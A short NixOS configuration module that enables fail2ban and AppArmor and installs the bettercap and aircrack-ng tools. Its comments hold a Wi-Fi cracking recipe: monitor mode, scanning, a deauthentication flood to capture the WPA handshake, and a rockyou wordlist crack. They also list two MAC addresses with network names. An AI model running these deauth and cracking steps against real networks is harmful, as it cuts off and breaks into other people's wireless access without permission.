{ pkgs, namespace, lib, config, ... }:

with lib;
with lib.${namespace};
let
  cfg = config.${namespace}.security;
in
{
  options.${namespace}.security = with types; {
    enable = mkBoolOpt false "Whether or not to enable security related protection.";
  };

  config = mkIf cfg.enable {
    services.fail2ban = {
      enable = true;
      bantime-increment = enabled;
    };
    security.apparmor = {
      enable = true;
      enableCache = true;
      killUnconfinedConfinables = true;
    };
    environment.systemPackages = with pkgs; [
      # 00:00
      bettercap
      # wlan0mon
      # 04:F0:21:BE:EF:99 sweettime
      # 00:B8:C2:29:F3:B3 yolo

      # 14:56
      # sudo airmon-ng start wlan0
      # iwconfig
      # sudo airodump-ng wlan0 -abg
      # sudo airodump-ng --bssid 0X:0X:0X:00:0X:0X: -c 2 wlan0
      # in order to force deauth and 4 way handshake(eapol): sudo aireplay-ng -0 0 -a 0X:0X:0X:00:0X:0X: wlan0
      # sudo aircrack-ng -w rockyou.txt handshake.cap
      aircrack-ng
    ];
  };
}
